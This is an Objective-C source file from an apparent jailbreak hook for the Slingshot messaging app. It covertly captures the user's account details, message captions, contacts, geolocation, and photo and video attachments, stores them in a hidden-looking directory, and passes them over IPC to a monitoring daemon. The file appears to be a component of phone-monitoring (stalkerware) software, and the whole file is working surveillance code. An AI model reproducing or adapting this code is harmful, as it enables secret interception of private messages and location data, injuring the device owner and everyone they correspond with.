//
//  SlingshotUtils.m
//  ExampleHook
//
//  Created by Makara on 6/20/14.
//
//

#import "SlingshotUtils.h"

#import "SHApplicationController.h"
#import "SHAuthenticationController.h"
#import "PFUser.h"
#import "SHDataService.h"
#import "SHShot.h"
#import "SHSendShotOperation.h"
#import "SHPerson.h"

#import "FxIMEvent.h"
#import "FxAttachment.h"
#import "FxRecipient.h"
#import "FxIMGeoTag.h"
#import "DefStd.h"
#import "StringUtils.h"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"

#import <objc/runtime.h>

static SlingshotUtils *_SlingshotUtils = nil;

@interface SlingshotUtils (private)
+ (NSString *) createTimeStamp;
+ (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension
				   extension: (NSString *) aExtension;
+ (void) downloadIncomingAttachment: (NSArray *) aArgs;

- (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
- (void) thread: (FxIMEvent *) aIMEvent;

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;
@end

@implementation SlingshotUtils

@synthesize mIMSharedFileSender;

+ (id) sharedSlingshotUtils {
    if (_SlingshotUtils == nil) {
        _SlingshotUtils = [[SlingshotUtils alloc] init];
        
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
			SharedFile2IPCSender *sharedFileSender = nil;
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kSlingshotMessagePort1];
			[_SlingshotUtils setMIMSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
        }
    }
    return (_SlingshotUtils);
}

- (id) init {
    if ((self = [super init])) {
        
    }
    return (self);
}

+ (NSDictionary *) currentUserInfo {
    UIApplication *slingshotApplication = [UIApplication sharedApplication];
    SHApplicationController *applicationDelegate = (SHApplicationController *)[slingshotApplication delegate];
    
    SHAuthenticationController *authController = nil;
    object_getInstanceVariable(applicationDelegate, "_authenticationController", (void **)&authController);
    
    //PFUser *currentUser = nil;
    //object_getInstanceVariable(authController, "_currentUser", (void **)&currentUser);
    
    NSMutableDictionary *currentUserInfo = [NSMutableDictionary dictionaryWithObject:[authController userUsername] forKey:@"username"];
    if ([authController userDisplayName] != nil) {
        [currentUserInfo setObject:[authController userDisplayName] forKey:@"userdisplayname"];
    }
    if ([authController userFullName] != nil) {
        [currentUserInfo setObject:[authController userFullName] forKey:@"userfullname"];
    }
    
    return (currentUserInfo);
}

+ (NSArray *) participantInfoWithIds: (NSArray *) aIdentifiers {
    UIApplication *slingshotApplication = [UIApplication sharedApplication];
    SHApplicationController *applicationDelegate = (SHApplicationController *)[slingshotApplication delegate];
    
    SHDataService *dataService = nil;
    object_getInstanceVariable(applicationDelegate, "_dataService", (void **)&dataService);
    
    NSMutableArray *participants = [NSMutableArray array];
    for (NSString *identifier in aIdentifiers) {
        id person = [dataService personWithIdentifier:identifier];
        [participants addObject:person];
        
        DLog(@"person = %@", person);
     }
    
    return (participants);
}


+ (void) sendSlingshotEvent: (FxIMEvent *) aIMEvent {
	SlingshotUtils *slingshotUtils = [[SlingshotUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:)
                             toTarget:slingshotUtils
                           withObject:aIMEvent];
	[slingshotUtils release];
}

#pragma mark - Capture -

+ (void) captureIncomingShot: (SHShot *) aShot {
    if ([aShot ownerIdentifier] != nil) {
        
        NSString * message          = nil;
        NSString * imServiceID		= @"Slingshot";
        NSString * myName			= nil;
        NSString * myID				= nil;
        NSString * myStatus			= nil;
        NSData   * myPhoto			= nil;
        NSString * convName			= nil;
        NSString * convID			= nil;
        NSString * senderID         = nil;
        NSString * senderName       = nil;
        NSData   * convPhoto		= nil;
        
        FxIMEvent *imEvent			 = [[FxIMEvent alloc] init];
        NSMutableArray *participants = [[NSMutableArray alloc] init];
        
        NSArray *shotParticipants = [self participantInfoWithIds:[NSArray arrayWithObject:[aShot ownerIdentifier]]];
        SHPerson *ownerPerson = [shotParticipants objectAtIndex:0];
        convName = [ownerPerson name];
        convID = [ownerPerson username];
        senderID = convID;
        senderName = convName;
        
        NSDictionary *currentUserInfo = [self currentUserInfo];
		DLog(@"username        = %@", [currentUserInfo objectForKey:@"username"]);
        DLog(@"userDisplayName = %@", [currentUserInfo objectForKey:@"userdisplayname"]);
        DLog(@"userFullName    = %@", [currentUserInfo objectForKey:@"userfullname"]);
        
        myName  = [currentUserInfo objectForKey:@"userdisplayname"];
		myID    = [currentUserInfo objectForKey:@"username"];
        
        message = [aShot caption];
            
        DLog(@"Direction : Incoming");
        DLog(@"ConversationID: %@",convID);
        DLog(@"ConversationName %@",convName);
        DLog(@"myName: %@",myName);
        DLog(@"myID: %@",myID);
        DLog(@"senderName: %@",senderName);
        DLog(@"senderID: %@",senderID);
        DLog(@"hasLocation: %d",[aShot hasLocation]);
        DLog(@"Message: %@",message);
        
        FxRecipient *participant = [[FxRecipient alloc] init];
        [participant setRecipNumAddr:myID];
        [participant setMPicture:myPhoto];
        [participant setRecipContactName:myName];
        [participant setMStatusMessage:myStatus];
        [participants addObject:participant];
        [participant release];
        
        // Sender location
        FxIMGeoTag *location = nil;
        if ([aShot hasLocation]) {
            location = [[[FxIMGeoTag alloc] init] autorelease];
            [location setMLongitude:[aShot longitude]];
            [location setMLatitude:[aShot latitude]];
            [location setMPlaceName:[aShot locationText]];
        }
        
        // Attachment is going to download...
        
        [imEvent setMDirection:kEventDirectionIn];
        [imEvent setMRepresentationOfMessage:(kIMMessageNone | kIMMessageText)];
        [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        [imEvent setMIMServiceID:imServiceID];
        [imEvent setMServiceID:kIMServiceSlingshot];
        [imEvent setMUserID:senderID];
        [imEvent setMUserDisplayName:senderName];
        [imEvent setMUserStatusMessage:nil];
        [imEvent setMUserPicture:nil];
        [imEvent setMUserLocation:location];
        [imEvent setMParticipants:participants];
        [imEvent setMConversationID:convID];
        [imEvent setMConversationName:convName];
        [imEvent setMConversationPicture:convPhoto];
        [imEvent setMMessage:message];
        [imEvent setMAttachments:nil];
        
        [participants release];
        
        NSArray *args = [NSArray arrayWithObjects:imEvent, aShot, nil];
        [NSThread detachNewThreadSelector:@selector(downloadIncomingAttachment:)
                                 toTarget:[self class]
                               withObject:args];
        
        [imEvent release];
    }
}

+ (void) captureOutgoingShot: (SHShot *) aShot withSendOperation: (SHSendShotOperation *) aSendOperation {
    NSString * message          = nil;
	NSString * imServiceID		= @"Slingshot";
	NSString * myName			= nil;
	NSString * myID				= nil;
	NSString * myStatus			= nil;
	NSData   * myPhoto			= nil;
	NSString * convName			= nil;
	NSString * convID			= nil;
	NSData   * convPhoto		= nil;
	
    NSArray *shotParticipants = [self participantInfoWithIds:[aSendOperation recipients]];
	
	for (SHPerson *person in shotParticipants) {
		FxIMEvent *imEvent          = [[FxIMEvent alloc] init];
		
        convName                    = [person name];
        convID                      = [person username];
        
        NSDictionary *currentUserInfo = [self currentUserInfo];
		DLog(@"username        = %@", [currentUserInfo objectForKey:@"username"]);
        DLog(@"userDisplayName = %@", [currentUserInfo objectForKey:@"userdisplayname"]);
        DLog(@"userFullName    = %@", [currentUserInfo objectForKey:@"userfullname"]);
		
		myName  = [currentUserInfo objectForKey:@"userdisplayname"];
		myID    = [currentUserInfo objectForKey:@"username"];
        message = [aShot caption];
		
		DLog(@"Direction: Outgoing");
		DLog(@"ConversationID: %@",convID);
		DLog(@"ConversationName %@",convName);
		DLog(@"UserID: %@",myID);
		DLog(@"UserName: %@",myName);
		DLog(@"UserLocation: %@",[aShot locationText]);
        DLog(@"Message: %@",message);
		
        NSMutableArray *participants = [[NSMutableArray alloc] init];
        
		DLog(@"================ Participant, %@, %@",[person name], [person username]);
        FxRecipient *participant = [[FxRecipient alloc] init];
        [participant setRecipNumAddr:[person username]];
        [participant setMPicture:nil];
        [participant setRecipContactName:[person name]];
        [participant setMStatusMessage:nil];
        [participants addObject:participant];
        [participant release];
        
        // User location
        FxIMGeoTag *myLocation = nil;
        if ([aShot hasLocation]) {
            myLocation = [[[FxIMGeoTag alloc] init] autorelease];
            [myLocation setMLongitude:[aShot longitude]];
            [myLocation setMLatitude:[aShot latitude]];
            [myLocation setMPlaceName:[aShot locationText]];
        }
        
        // Attachment
        FxAttachment *attachment = [[[FxAttachment alloc] init] autorelease];
        NSData *thumbnailImageData = UIImageJPEGRepresentation([aShot thumbnailImage], 1);
        [attachment setMThumbnail:thumbnailImageData];
        
        NSString *mediaPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imSlingshot/"] ;
        
        NSData *localMediaData = nil;
        if ([aShot isVideo]) {
            localMediaData = [NSData dataWithContentsOfURL:[aShot localMediaFileURL]];
            mediaPath = [self getOutputPath:mediaPath extension:[[aShot mediaFileName] pathExtension]];
            [localMediaData writeToFile:mediaPath atomically:YES];
            if ([localMediaData length] == 0) {
                mediaPath = @"video/mp4";
            }
        } else if ([aShot isPhoto]) {
            //localMediaData = UIImageJPEGRepresentation([aShot image], 1);
            localMediaData = [NSData dataWithContentsOfURL:[aShot localMediaFileURL]];
            mediaPath = [self getOutputPath:mediaPath extension:[[aShot mediaFileName] pathExtension]];
            [localMediaData writeToFile:mediaPath atomically:YES];
            if ([localMediaData length] == 0) {
                mediaPath = @"image/jpeg";
            }
        }
        /*
         Note: mediaPath will diffferent in millisecond e.g: outgoing Shot to three recipients, with the same file size
         a) mediaPath = /var/.lsalcore/attachments/imSlingshot/im_2014-07-23_11:06:00:524.jpg
         b) mediaPath = /var/.lsalcore/attachments/imSlingshot/im_2014-07-23_11:06:00:685.jpg
         c) mediaPath = /var/.lsalcore/attachments/imSlingshot/im_2014-07-23_11:06:00:747.jpg
         */
        DLog(@"mediaPath = %@, length = %lu", mediaPath, (unsigned long)[localMediaData length]);
        [attachment setFullPath:mediaPath];
		
		[imEvent setMDirection:kEventDirectionOut];
		[imEvent setMRepresentationOfMessage:(kIMMessageNone | kIMMessageText)];
		[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[imEvent setMIMServiceID:imServiceID];
		[imEvent setMServiceID:kIMServiceSlingshot];
		[imEvent setMUserID:myID];
		[imEvent setMUserDisplayName:myName];
		[imEvent setMUserStatusMessage:myStatus];
		[imEvent setMUserPicture:myPhoto];
        [imEvent setMUserLocation:myLocation];
		[imEvent setMParticipants:participants];
		[imEvent setMConversationID:convID];
		[imEvent setMConversationName:convName];
		[imEvent setMConversationPicture:convPhoto];
		[imEvent setMMessage:message];
		[imEvent setMAttachments:[NSArray arrayWithObject:attachment]];
        
		[participants release];
		
        [self sendSlingshotEvent:imEvent];
        
		[imEvent release];
    }
}

#pragma mark - Utils -

+ (NSString *) createTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SSS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}

+ (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension
				   extension: (NSString *) aExtension {
	NSString *formattedDateString = [self createTimeStamp];
	NSString *outputPath = [[NSString alloc] initWithFormat:@"%@im_%@.%@",
							aOutputPathWithoutExtension,
							formattedDateString,
							aExtension];
	return [outputPath autorelease];
}

+ (void) downloadIncomingAttachment: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    
    @try {
        FxIMEvent *imEvent = [aArgs objectAtIndex:0];
        SHShot *aShot = [aArgs objectAtIndex:1];
        
        // Downloding attachment...
        FxAttachment *attachment = [[[FxAttachment alloc] init] autorelease];
        NSData *thumbnailImageData = UIImageJPEGRepresentation([aShot thumbnailImage], 1);
        [attachment setMThumbnail:thumbnailImageData];
        
        NSString *mediaPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imSlingshot/"] ;
        
        NSData *downloadMediaData = nil;
        if ([aShot isVideo]) {
            downloadMediaData = [NSData dataWithContentsOfURL:[NSURL URLWithString:[aShot mediaURI]]];
            mediaPath = [self getOutputPath:mediaPath extension:[[aShot mediaFileName] pathExtension]];
            [downloadMediaData writeToFile:mediaPath atomically:YES];
            if ([downloadMediaData length] == 0) {
                mediaPath = @"video/mp4";
            }
        } else if ([aShot isPhoto]) {
            downloadMediaData = [NSData dataWithContentsOfURL:[NSURL URLWithString:[aShot mediaURI]]];
            mediaPath = [self getOutputPath:mediaPath extension:[[aShot mediaFileName] pathExtension]];
            [downloadMediaData writeToFile:mediaPath atomically:YES];
            if ([downloadMediaData length] == 0) {
                mediaPath = @"image/jpeg";
            }
        }
        DLog(@"mediaPath = %@, length = %lu", mediaPath, (unsigned long)[downloadMediaData length]);
        [attachment setFullPath:mediaPath];
        
        [imEvent setMAttachments:[NSArray arrayWithObject:attachment]];
        
        [self sendSlingshotEvent:imEvent];
        
    }
    @catch (NSException *exception) {
        DLog(@"Downloading incoming Slingshot attachment, exception = %@", exception);
    }
    @finally {
        ;
    }
    
    [aArgs release];
    [pool drain];
}

#pragma mark - Send event data -

- (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
    
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
		successfully = [messagePortSender writeDataToPort:aData];
		[messagePortSender release];
		messagePortSender = nil;
	} else {
		SharedFile2IPCSender *sharedFileSender  = [[SlingshotUtils sharedSlingshotUtils] mIMSharedFileSender];
        DLog(@"sharedFileSender %@", sharedFileSender);
		successfully = [sharedFileSender writeDataToSharedFile:aData];
	}
	return (successfully);
}

- (void) thread: (FxIMEvent *) aIMEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
        
        if (aIMEvent) {
            NSString *msg = [StringUtils removePrivateUnicodeSymbols:[aIMEvent mMessage]];
            DLog(@"Slingshot message after remove emoji = %@", msg);
            
            if ([msg length] || [[aIMEvent mAttachments] count]) {
                [aIMEvent setMMessage:msg];
                
                NSMutableData* data			= [[NSMutableData alloc] init];
                NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
				[archiver encodeObject:aIMEvent forKey:kIMMsgArchived];
				[archiver finishEncoding];
				[archiver release];
                
                // -- first
                BOOL isSendingOK = [self sendDataToPort:data portName:kSlingshotMessagePort1];
                DLog (@"Sending to first port %d", isSendingOK)
                
                if (!isSendingOK) {
                    DLog (@"First sending Slingshot fail");
                    
                    // -- second
                    isSendingOK = [self sendDataToPort:data portName:kSlingshotMessagePort2];
                    
                    if (!isSendingOK) {
                        DLog (@"Second sending Slingshot also fail");
                        
                        // -- Third port ----------
                        [NSThread sleepForTimeInterval:3];
                        
                        isSendingOK = [self sendDataToPort:data portName:kSlingshotMessagePort3];
                        if (!isSendingOK) {
                            DLog (@"Third sending Slingshot also fail, so delete the attachment");
                            [SlingshotUtils deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];
                        }
                    }
                }
                [data release];
            }
            
        } // aIMEvent
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray {
	// delete the attachment files
	if (aAttachmentArray && [aAttachmentArray count] != 0) {
		for (FxAttachment *attachment in aAttachmentArray) {
			NSString *path = [attachment fullPath];
			DLog (@"Deleting Slingshot attachment file: %@", path)
			[[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		}
	}
}

@end
